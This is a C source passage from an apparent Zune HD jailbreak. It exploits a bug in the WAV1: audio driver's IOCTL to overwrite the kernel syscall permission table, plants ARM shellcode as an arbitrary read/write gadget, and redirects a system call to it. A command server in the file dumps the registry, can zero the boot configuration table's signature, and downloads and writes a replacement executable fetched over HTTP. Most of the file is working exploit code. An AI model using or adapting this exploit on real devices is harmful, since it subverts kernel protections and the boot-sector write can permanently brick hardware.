					if (bytesRead > 2048) bytesRead = 2048;
					if (bytesRead > 0 && resp_len + bytesRead <= 8192) {
						memcpy(resp + resp_len, sector, bytesRead);
						resp_len += bytesRead;
					}

					// Check for ECEC
					for (u32 i = 0; i + 3 < bytesRead; i++) {
						if (sector[i]=='E' && sector[i+1]=='C' && sector[i+2]=='E' && sector[i+3]=='C') {
							resp[28] = 1; // ecec_found flag
							resp[29] = d; // which device
							resp[30] = i & 0xFF;
							resp[31] = (i >> 8) & 0xFF;
							best_dev = d;
							best_ecec_off = i;

							if (subcmd == 1) {
								// Corrupt BCT
								sector[i] = 0;
								sector[i+1] = 0;
								sector[i+2] = 0;
								sector[i+3] = 0;
								SetFilePointer(h, 0, NULL, FILE_BEGIN);
								DWORD bytesWritten = 0;
								BOOL wok = WriteFile(h, sector, 512, &bytesWritten, NULL);
								resp[2] = wok ? 0x10 : 0x11;
								resp[3] = bytesWritten & 0xFF;
							}
							break;
						}
					}

					n_found++;
					CloseHandle(h);
				}
				resp[1] = n_found;

			} else if (cmd[0] == 23) {
				// Cmd 23: Registry dump -- enumerate keys and values
				// subcmd 0: dump HKLM\System\StorageManager
				// subcmd 1: dump HKLM\Drivers\BlockDevice
				// subcmd 2: dump custom path (path in cmd bytes 2-31 as ASCII)
				HKEY root = HKEY_LOCAL_MACHINE;
				LPCWSTR paths[] = {
					L"System\\StorageManager",
					L"Drivers\\BlockDevice",
					NULL
				};

				// Build path from subcmd or custom
				WCHAR regpath[128];
				memset(regpath, 0, sizeof(regpath));
				u32 sub = cmd[1];
				if (sub < 2 && paths[sub]) {
					wcscpy(regpath, paths[sub]);
				} else {
					// Convert ASCII from cmd[2..31] to wide
					for (int i = 0; i < 29 && cmd[2+i]; i++)
						regpath[i] = (WCHAR)cmd[2+i];
				}

				resp_len = 32;
				HKEY hk;
				LONG rc = RegOpenKeyExW(root, regpath, 0, KEY_READ, &hk);
				resp[1] = (rc == ERROR_SUCCESS) ? 1 : 0;
				*(u32*)&resp[4] = (u32)rc;

				if (rc == ERROR_SUCCESS) {
					// Enumerate subkeys
					WCHAR subkey[128];
					for (DWORD i = 0; ; i++) {
						DWORD namelen = 128;
						if (RegEnumKeyExW(hk, i, subkey, &namelen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
							break;
						// Append as ASCII to response
						for (DWORD j = 0; j < namelen && resp_len < 8000; j++)
							resp[resp_len++] = (unsigned char)(subkey[j] & 0x7F);
						if (resp_len < 8000) resp[resp_len++] = '\n';
					}
					// Enumerate values
					if (resp_len < 8000) resp[resp_len++] = '-';
					if (resp_len < 8000) resp[resp_len++] = '\n';
					WCHAR valname[128];
					BYTE valdata[256];
					for (DWORD i = 0; ; i++) {
						DWORD namelen = 128;
						DWORD datalen = 256;
						DWORD type = 0;
						if (RegEnumValueW(hk, i, valname, &namelen, NULL, &type, valdata, &datalen) != ERROR_SUCCESS)
							break;
						// Format: "name=type:hex\n"
						for (DWORD j = 0; j < namelen && resp_len < 7900; j++)
							resp[resp_len++] = (unsigned char)(valname[j] & 0x7F);
						resp[resp_len++] = '=';
						// Type as digit
						resp[resp_len++] = '0' + (type % 10);
						resp[resp_len++] = ':';
						// Data as hex (first 32 bytes)
						for (DWORD j = 0; j < datalen && j < 32 && resp_len < 7950; j++) {
							unsigned char hi = (valdata[j] >> 4) & 0xF;
							unsigned char lo = valdata[j] & 0xF;
							resp[resp_len++] = hi < 10 ? '0'+hi : 'a'+hi-10;
							resp[resp_len++] = lo < 10 ? '0'+lo : 'a'+lo-10;
						}
						if (resp_len < 8000) resp[resp_len++] = '\n';
					}
					RegCloseKey(hk);
				}

			} else if (cmd[0] == 99) {
				// Self-update: download new payload from httpserv and write to \Flash2\
				// Place the new binary at: ZuneHD/zuneslayer_debug/dumps/nativeapp_update.exe
				// httpserv serves it at GET /upload/nativeapp_update.exe (via dumps dir)
				unsigned char* update_buf = (unsigned char*)malloc(256 * 1024);
				if (update_buf) {
					int got = http_get("/nativeapp_update.exe", update_buf, 256 * 1024);
					if (got > 1024) {
						DeleteFileW(L"\\Flash2\\payload_new.exe");
						HANDLE hf = CreateFileW(L"\\Flash2\\payload_new.exe",
							GENERIC_WRITE, 0, NULL, 2, FILE_ATTRIBUTE_NORMAL, NULL);
						if (hf != INVALID_HANDLE_VALUE) {
							DWORD written = 0;
							WriteFile(hf, update_buf, got, &written, NULL);
							CloseHandle(hf);
							resp[1] = 1; // success
							*(u32*)&resp[4] = written;
						} else {
							resp[1] = 2; // CreateFile failed
							*(u32*)&resp[4] = GetLastError();
						}
					} else {
						resp[1] = 3; // download failed
						*(u32*)&resp[4] = got;
					}
					free(update_buf);
				} else {
					resp[1] = 4; // malloc failed
				}

			} else {
				resp[0] = 0xFF; // unknown command
			}

			http_post_response(resp, resp_len);
		}
	}

    return 1;
}


static int hax_30() {
	BOOL b = false;
	HANDLE h;
	DWORD outsz = 0;
	void* outb = calloc(1024, 1);

	int tgt_val = 0;
	int tgt_addr = 0x80000000;

	h = CreateFileW(L"WAV1:", GENERIC_READ, 0, 0,3, 0x80, 0);
#pragma pack(push,1)
		struct Input{
		int idk;
		int cmd;
		void* d;
		int b;
		int c;
	};
	#pragma pack(pop)
		struct Input* inbuf = (struct Input*)calloc(sizeof(Input), 1);
		inbuf->cmd = 0x11;
		inbuf->b = tgt_val;
		inbuf->d = NULL;
	b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	if(b != 0) {
		inbuf->cmd = 0x10;
		inbuf->b = tgt_addr;
		inbuf->d = NULL;
		b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	}

	free(outb);
	return 0;
}

int hax() {
	DWORD o = 0;
	BOOL b = false;
	HANDLE h;
	DWORD outsz = 0;


	/* Step 1: Use bug in libnmvwavedev.dll to write controled value over the syscall parameter validation table */
	h = CreateFileW(L"WAV1:", GENERIC_READ, 0, 0,3, 0x80, 0);
	#pragma pack(push,1)
		struct Input{
		int ptr_idx;
		int subcmd;
		int a;
		int b;
		int c;
	};
	#pragma pack(pop)

	DWORD get_exit_code_thread_ptr = 0x80061408;

	struct Input* inbuf = (struct Input*)calloc(sizeof(Input), 1);
	void* outb = calloc(1024, 1);
	inbuf->subcmd = 0x13; // 7 => |= 2, 8 => unset bit 2
	inbuf->a = get_exit_code_thread_ptr - 0x178; // addr of perms for GetExitCodeThread - offset
	inbuf->b = 0; // tgt value

	b = DeviceIoControl(h, /*cmd*/0x1d000c, inbuf, sizeof(Input), /* outb, != null */ outb, /* outs, >3 */ 1024, &outsz, NULL);
	if(b != 0) {
		//std::swprintf(foo, L"gud ioctl: %x %x", *((int*)outb), *((int*)outb + 4));
		//ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	} else {
		DWORD err = GetLastError();
		std::swprintf(foo, L"bad ioctl: %x", err);
		ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
		return 0;
	}
	free(inbuf);

	/* We can now use kernel pointers as outputs for GetExitCodeThread */

	/* Step 2: Create a arb r/w gadget */
	DWORD base = 0x80015020;

	/*
ldr r3, =0x1337
cmp r2, r3
bne not_store
strb r1, [r0]
b ret
not_store:
add r3, #1
cmp r2, r3
bne err
ldrb r0, [r0]
ret:
bx lr

err:
ldr r0, =0x80072360
bx r0


\x28\x30\x9f\xe5
\x03\x00\x52\xe1
\x01\x00\x00\x1a
\x00\x10\xc0\xe5

\x03\x00\x00\xea
\x01\x30\x83\xe2
\x03\x00\x52\xe1
\x01\x00\x00\x1a

\x00\x00\xd0\xe5
\x1e\xff\x2f\xe1
\x04\x00\x9f\xe5
\x10\xff\x2f\xe1

\x37\x13\x00\x00
\x60\x23\x07\x80"

	*/
	kwr(base+0x00, 0xe59f3028);
    kwr(base+0x04, 0xe1520003);
	kwr(base+0x08, 0x1a000001);
	kwr(base+0x0c, 0xe5c01000);

	kwr(base+0x10, 0xea000003);
	kwr(base+0x14, 0xe2833001);
	kwr(base+0x18, 0xe1520003);
	kwr(base+0x1c, 0x1a000001);

	kwr(base+0x20, 0xe5d00000);
	kwr(base+0x24, 0xe12fff1e);
	kwr(base+0x28, 0xe59f0004);
	kwr(base+0x2c, 0xe12fff10);

	kwr(base+0x30, 0x00001337);
	kwr(base+0x34, 0x80072360);

	/*
	; write gadget
	strb r0, [r0]
	bx lr
	;"\x00\x00\xc0\xe5 \x1e\xff\x2f\xe1"
	
	kwr(base+0x8, 0xe5c00000);
    kwr(base+0xc, 0xe12fff1e);*/

	/* Step 3: make getfsheapinfo into arb r/w gadget we just made (normally not usable as untrusted) */
	kwr(0x80060da0, base);
	
	/* Step 4: allow access to VirtualCopyEx for untrusted via GetRomFileInfo */
	//kwr(0x80060d98, 0x8006c140);
	/* Step 4: allow access to CreateStaticMapping for untrusted via GetRomFileInfo */
	//kwr(0x80060d98, 0x80069de0);

/*!!!!!!!!!!!!!!!!!!!!!! GetRomFileInfo was problen */



	//fuck
	// kwr(0x8006c1b4, 0xea0018e8); //
    //kwr(0x800698b4, 0xea002328); // vmcpy pf = h
	//kwr(0x800698c8, 0xea002323); // did vmcpy phy f?  
   //kwr(0x80065bac, 0xea00326a); // ivp f = nh
	//kwr(0x80065BA4, 0xea00326c); // ivp ok = h

	//f in vmcpy phys

	/* Step 5: Defuck kernel (remove our original gadget)*/
	//BYTE buf[] = {0x02, 0x0d, 0, 0, 0, 0, 0, 0};
	//kmemcpy(get_exit_code_thread_ptr, buf, sizeof(buf));
	


	// Magic over

	// Find all processes:


		//DWORD hi = kreadb(0xFFF00000);
//	DWORD hi = 0;
//	std::swprintf(foo, L"read: %x, %d", hi, GetLastError());
   // ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	
#if 0

	u32 offset_nk = 0x80bee010;
	u32 nk = kreadu32(offset_nk);
	//BYTE buf2[1024] = {0};
	//kmemcpy(base, buf2, sizeof(buf2));

	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0);
	nk = kreadu32(nk+0); // xna
	nk = kreadu32(nk+0);  //udp2tcp
	//nk = kreadu32(nk+0);  // native app
	//nk = kreadu32(nk+0); // nk

	u32 proc_next = kreadu32(nk+0);
	u32 proc_last = kreadu32(nk+4);
	u32 id = kreadu32(nk+0xc);
	u32 proc_name_ptr = kreadu32(nk+0x20);
	u32 ppd = kreadu32(nk+0x2c);

		u32 off = 0;
	std::wstring name;
	u16 c = kreadu16(proc_name_ptr);
	while(c != 0) {
		name.push_back(c);
		off+=2;
		c = kreadu16(proc_name_ptr + off);
	}

#if 0
	char* m = (char*)malloc(1024*1024*16);
	memset(m, 0x12, 1024*1024*16);
	m = (char*)malloc(1024*1024*16);
	memset(m, 0x42, 1024*1024*16);

	//0 1 2 3
	u32 idx = 3;
	u32 ppd_idx = kreadu32(ppd+4*idx);

	u32 test = 0xFFF00C01;//ppd_idx+0x01000000;
	kmemcpy(ppd+4*idx, (BYTE*)&test, 4);

	ppd_idx = kreadu32(ppd+4*idx);

	
	u32 pge = (ppd_idx >> 9) << 9;
	u32 ppp = kreadu32(pge);

		//std::swprintf(foo, L"ppd[%d]:%p", idx, ppd_idx);
	std::swprintf(foo, L"%p : %p : %p : %p", ppd_idx, pge, ppp, test);
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif

#if 0
	base = 0x8006c140;
	kwr(0x80060da0, base);

	void* tmp_buf  = calloc(0x20000, 1);
	void* tmp_buf2 = calloc(0x20000, 1);

	HMODULE mh = GetModuleHandleW(L"coredll.dll");
	VCE vce = (VCE) GetProcAddress(mh, L"GetFSHeapInfo");

	SetLastError(0);
	//BOOL r = vce(nk, tmp_buf, NULL, 0x8000, 0x2000, 0x400|0x200|0x4);
    BOOL r = vce(nk, tmp_buf, NULL, (DWORD)tmp_buf2, 0x1000, 0x200|0x4);
	DWORD err = GetLastError();
	//std::swprintf(foo, L"r = %d, dat = %d, err=%d %p, %p, %s", r, *((int*)tmp_buf), err, tmp_buf, mh, name.c_str());
	std::swprintf(foo, L"r = %d, e=%d", f,  err);
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif


#endif

#if 1

	DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(
        NULL,                        
        0,
        Server,
        NULL,
        0,
        &dwThreadId);

	
		WaitForSingleObject(hThread, INFINITE);
	
#endif


	//TODO: get_exit_code_thread_ptr - 0x178 + 0x1ac
	//get_exit_code_thread_ptr - 0x178 + 0x1ac + 4 {+8,+}

	/* tests */
	//BYTE nop[] = { 0x00, 0xf0, 0x20, 0xe3 };
	//BYTE ret[] = { 0x1e, 0xff, 0x2f, 0xe1 };
	//kmemcpy(0x8007255c, ret, sizeof(ret)); // reboot no

	//kmemcpy(0x8006ab3c, nop, sizeof(nop)); // halt no
	//kmemcpy(0x8006ab40, nop, sizeof(nop)); //

	//kmemcpy(0x80073b04, ret, sizeof(ret)); // clean boot no

	//kmemcpy(0x800725d8, ret, sizeof(ret)); // power no

	//ZDKSystem_ShowMessageBox(L"PWNED by CUB3D", MESSAGEBOX_TYPE_OK);

	//todo: unfuck stuff we've broke (perms table) (all)
	// release as app??
	// check fw version
	// 

	return 0;
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd) {


#if 0
if(CopyFileW(L"\\gametitle\\584E07D1\\Content\\nativeapp.exe", L"\\Flash2\\payload.exe", false) != TRUE) {
	std::swprintf(foo, L"Copy fail");
	ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
	return 0;
}
#endif

SuppressReboot();

#if 1
	hax();
#endif

#if 0
	hax_30();
#endif



#if 0

WIN32_FIND_DATA ffd;
   HANDLE hFind = INVALID_HANDLE_VALUE;
   BOOL r=1;
      hFind = FindFirstFile(L"\\Flash2\\p*", &ffd);

if (INVALID_HANDLE_VALUE == hFind) 
   {
	   ZDKSystem_ShowMessageBox(L"BAD", MESSAGEBOX_TYPE_OK);
      return 0;
   } 

for(int i =0; i <9; i++) {
	  r = FindNextFile(hFind, &ffd);
	  if (r == 0) {break;}
}
	  std::swprintf(foo, L"test %s r: %d", ffd.cFileName, r);
ZDKSystem_ShowMessageBox(foo, MESSAGEBOX_TYPE_OK);
#endif

//"\\":
//"Flash/: ok
//"Mounted Volume/": BAD
//Flash2/: ok
//gametitle/: app
//gamert/: xna
//selfcheckcapture.raw
//profiles/default/: bad
//Documents and Settings/default: bad
//my Documents/: bad
//Program files/: bad
//temp/: bad
//windows/

//"\\flash":
//zconfig.dat
//zver.dat

//"\\flash2":
	//zunedb.dat  
	//dncache
//zunedb.bak
//devcert.dat
//drmstore.dat
//browser/
//content/
//dumpfiles/
//runtimecache/

//"\\Windows":
//System.mky
//default.mky
//.. probably just nk

	return 0;
}
